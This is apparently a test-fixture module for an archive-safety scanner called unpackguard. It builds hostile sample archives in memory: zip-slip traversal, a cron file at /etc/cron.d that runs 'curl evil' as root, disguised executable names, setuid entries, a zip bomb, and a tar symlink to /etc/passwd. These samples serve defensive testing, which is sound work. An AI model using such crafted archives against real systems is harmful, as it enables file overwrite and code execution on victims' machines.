"""Synthetic archive builders used by the test-suite.

Everything is generated in-memory from the standard library, so the tests need
no fixtures committed to the repository and stay deterministic across
platforms.  Each helper returns the path it wrote.
"""

from __future__ import annotations

import contextlib
import io
import os
import tarfile
import time
import warnings
import zipfile

from unpackguard import __version__

_DIR_PERM = 0o755
_FILE_PERM = 0o644
_LINK_PERM = 0o120777

#: Synthetic archives intentionally contain duplicate names; silence them.
warnings.filterwarnings("ignore", message="Duplicate name")


@contextlib.contextmanager
def _raw_stored_names():
    """Force the writer to emit exactly ``orig_filename`` bytes.

    ``zipfile`` normally re-encodes names and sets the UTF-8 flag.  Legacy
    archives do neither, so we temporarily disable that behaviour to build a
    faithful GBK / Big5 fixture.
    """
    original = zipfile.ZipInfo._encodeFilenameFlags

    def patched(self: zipfile.ZipInfo) -> tuple[bytes, int]:  # type: ignore[no-untyped-def]
        return self.orig_filename, self.flag_bits

    zipfile.ZipInfo._encodeFilenameFlags = patched  # type: ignore[method-assign]
    try:
        yield
    finally:
        zipfile.ZipInfo._encodeFilenameFlags = original  # type: ignore[method-assign]


def _file_info(arcname: str, size: int, mode: int = _FILE_PERM) -> tarfile.TarInfo:
    info = tarfile.TarInfo(arcname)
    info.size = size
    info.mode = mode
    info.mtime = int(time.time())
    return info


def write_zip_simple(tmpdir: str, *, name: str = "basic.zip") -> str:
    """An entirely boring archive: should score 100."""
    path = os.path.join(tmpdir, name)
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("README.md", "# demo\n" * 8)
        zf.writestr("src/main.py", "print('hello')\n")
        zf.writestr("src/util.py", "def helper():\n    return 42\n")
        info = zipfile.ZipInfo("docs/")
        info.external_attr = (_DIR_PERM << 16) | 0x10
        zf.writestr(info, "")
        zf.writestr("docs/guide.txt", "guides\n")
    return path


def write_zip_traversal(tmpdir: str, *, name: str = "traversal.zip") -> str:
    """Classic zip-slip plus an absolute POSIX path."""
    path = os.path.join(tmpdir, name)
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("safe.txt", "ok\n")
        zf.writestr("../../escaped.txt", "owned\n")
        zf.writestr("/etc/cron.d/payload", "* * * * * root curl evil\n")
    return path


def write_zip_mixed_attacks(tmpdir: str, *, name: str = "attacks.zip") -> str:
    """A grab-bag generator used by most rule tests."""
    path = os.path.join(tmpdir, name)

    def add(zf: zipfile.ZipFile, arcname: str, data: str = "x", perm: int = _FILE_PERM) -> None:
        info = zipfile.ZipInfo(arcname)
        info.external_attr = perm << 16
        info.create_system = 3
        zf.writestr(info, data)

    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        add(zf, "ok.txt", "fine\n")
        add(zf, "invoice.pdf.exe", "MZ...\n")
        add(zf, "report.pdf\x20\x20.exe", "double\n")
        add(zf, "a/b/../../escape.txt", "boom\n")
        add(zf, "/absolute/path.txt", "boom\n")
        add(zf, "C:/Windows/System32/evil.dll", "boom\n")
        add(zf, "notes.txt:stream.ps1", "stream\n")
        add(zf, "files/inn.exe", "exec\n")
        add(zf, "id_rsa", "-----BEGIN OPENSSH PRIVATE KEY-----\n")
        add(zf, ".git/config", "[core]\n")
        add(zf, "Shadow-‮exe.txt", "bidi\n")
        add(zf, "SETUID.bin", "x", perm=0o104755)
        add(zf, "world-writable.sh", "#!/bin/sh\n", perm=0o100666)
        # case-insensitive collision pair
        add(zf, "Data/Report.TXT", "one\n")
        add(zf, "data/report.txt", "two\n")
        # duplicate name
        add(zf, "twice.txt", "first\n")
        add(zf, "twice.txt", "second\n")
        # trailing dot / space
        add(zf, "weird.", "dot\n")
        # nested archive member
        inner = io.BytesIO()
        with zipfile.ZipFile(inner, "w", zipfile.ZIP_DEFLATED) as nested:
            nested.writestr("inner.txt", "nested payload\n")
        zf.writestr("bundle.zip", inner.getvalue())
    return path


def write_zip_bomb(tmpdir: str, *, name: str = "bomb.zip") -> str:
    """A tiny archive that expands enormously (but harmlessly in memory)."""
    path = os.path.join(tmpdir, name)
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        zf.writestr("payload.dat", b"\x00" * (4 * 1024 * 1024))
    return path


def write_zip_legacy_names(tmpdir: str, *, name: str = "legacy.zip") -> str:
    """GBK / Big5 filenames with the UTF-8 flag *not* set (very common)."""
    path = os.path.join(tmpdir, name)
    with _raw_stored_names(), zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        for raw in (
            "中文合同.txt".encode("gb18030"),
            "報告-2026.pdf".encode("big5"),
            "plain.txt".encode("ascii"),
        ):
            info = zipfile.ZipInfo()
            info.filename = raw.decode("cp437", "replace")
            info.orig_filename = raw
            info.flag_bits = 0  # deliberately NOT UTF-8
            info.external_attr = _FILE_PERM << 16
            zf.writestr(info, "payload\n")
    return path


def write_tar_simple(tmpdir: str, *, name: str = "basic.tar") -> str:
    path = os.path.join(tmpdir, name)
    with tarfile.open(path, "w") as tf:
        for arcname, payload in (
            ("README.md", "# demo\n"),
            ("src/main.py", "print('hello')\n"),
        ):
            data = payload.encode("utf-8")
            info = tarfile.TarInfo(arcname)
            info.size = len(data)
            info.mode = _FILE_PERM
            tf.addfile(info, io.BytesIO(data))
    return path


def write_tar_sneaky(tmpdir: str, *, name: str = "sneaky.tar") -> str:
    """TAR with a symlink escaping the destination and a device node."""
    path = os.path.join(tmpdir, name)
    import time

    with tarfile.open(path, "w") as tf:
        data = b"ok\n"
        info = tarfile.TarInfo("notes.txt")
        info.size = len(data)
        info.mode = _FILE_PERM
        info.mtime = int(time.time())
        tf.addfile(info, io.BytesIO(data))

        link = tarfile.TarInfo("escape")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/passwd"
        link.mode = _LINK_PERM
        tf.addfile(link)

        fifo = tarfile.TarInfo("pipe")
        fifo.type = tarfile.FIFOTYPE
        fifo.mode = 0o010644
        tf.addfile(fifo)

        setuid = tarfile.TarInfo("suid.bin")
        setuid.size = len(data)
        setuid.mode = 0o104755
        tf.addfile(setuid, io.BytesIO(data))
    return path


def write_tar_gz(tmpdir: str, *, name: str = "bundle.tar.gz") -> str:
    path = os.path.join(tmpdir, name)
    with tarfile.open(path, "w:gz") as tf:
        data = (b"x" * 4096)
        info = tarfile.TarInfo("bundle/payload.dat")
        info.size = len(data)
        info.mode = _FILE_PERM
        tf.addfile(info, io.BytesIO(data))
    return path


def write_nested_chain(tmpdir: str, *, name: str = "chain.zip") -> str:
    """Three levels of archives inside archives."""
    level2 = io.BytesIO()
    with zipfile.ZipFile(level2, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("deep.txt", "bottom\n")
    level1 = io.BytesIO()
    with zipfile.ZipFile(level1, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("middle.zip", level2.getvalue())
    path = os.path.join(tmpdir, name)
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("inner.zip", level1.getvalue())
    return path


def write_not_archive(tmpdir: str, *, name: str = "random.bin") -> str:
    path = os.path.join(tmpdir, name)
    with open(path, "wb") as fh:
        fh.write(os.urandom(512))
    return path


def version() -> str:
    return __version__
